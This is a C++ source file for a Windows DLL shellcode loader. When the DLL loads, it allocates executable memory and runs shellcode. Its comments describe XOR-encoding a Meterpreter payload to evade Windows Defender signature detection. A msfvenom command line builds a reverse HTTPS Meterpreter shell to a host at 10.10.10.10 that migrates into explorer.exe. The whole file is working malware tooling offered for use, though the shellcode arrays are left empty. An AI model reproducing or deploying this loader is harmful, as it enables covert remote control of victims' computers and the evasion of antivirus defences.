/* Payload.cpp
   ===========
   Creates a thread when loaded by a process that maps a rwx page in memory,
   copies the meterpreter payload into the memory and then executes it. Use
   an "xor" encoded payload to bypass signature detection on the DLL file.
   If using a x64 DLL payload, compile for x64 and see the commented section,
   break payload into additional shellcode arrays to bypass compiler limits.
   Tested against Windows 10 Enterprise Build 18363 with updated Defender.
*/
#include "pch.h"
#include "framework.h"
#include "Payload.h"
#include "memoryapi.h"
#include "wincrypt.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif
extern "C" { int _afxForceUSRDLL; }

HINSTANCE g_hMainDll = NULL;






//msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -e x86/xor_dynamic prependmigrate=true prependmigrateprocess=explorer.exe -i 50 -f c -o payload.c 
//just generate the shellcode and randomly put it into 4 parts:
unsigned char shellcode[] = "";
unsigned char shellcode2[] = "";
unsigned char shellcode3[] = "";
unsigned char shellcode4[] = "";

DWORD WINAPI ClientThread(LPVOID lpParameter)
{
	MSG Msg;
	void* pShellcode;
	HANDLE hProcess = GetCurrentProcess();
	pShellcode = VirtualAllocEx(hProcess, NULL, sizeof(shellcode) + sizeof(shellcode2) + sizeof(shellcode3) + sizeof(shellcode4), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	//pShellcode = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(pShellcode, shellcode, sizeof(shellcode)-1);
	memcpy((void*)((unsigned long)pShellcode + (unsigned long)sizeof(shellcode) - 1), shellcode2, sizeof(shellcode2) - 1);
	memcpy((void*)((unsigned long)pShellcode + (unsigned long)sizeof(shellcode) + (unsigned long)sizeof(shellcode2) - 2), shellcode3, sizeof(shellcode3) - 1);
	memcpy((void*)((unsigned long)pShellcode + (unsigned long)sizeof(shellcode) + (unsigned long)sizeof(shellcode2) + (unsigned long)sizeof(shellcode3)- 3), shellcode4, sizeof(shellcode4) - 1);
	Sleep(30);
	int (*func)();
	func = (int (*)()) pShellcode;
	(*func)();
	while (GetMessage(&Msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}
	return 0;
}

BOOL WINAPI EXPORT DllMain(IN PVOID hInstanceDll, IN ULONG dwReason, IN PVOID reserved)
{
	g_hMainDll = (HINSTANCE)hInstanceDll;
	HANDLE threadHandle = NULL;
	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
		threadHandle = CreateThread(NULL, 0, ClientThread, NULL, 0, NULL);
		if (threadHandle != NULL) {
			CloseHandle(threadHandle);
		}
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}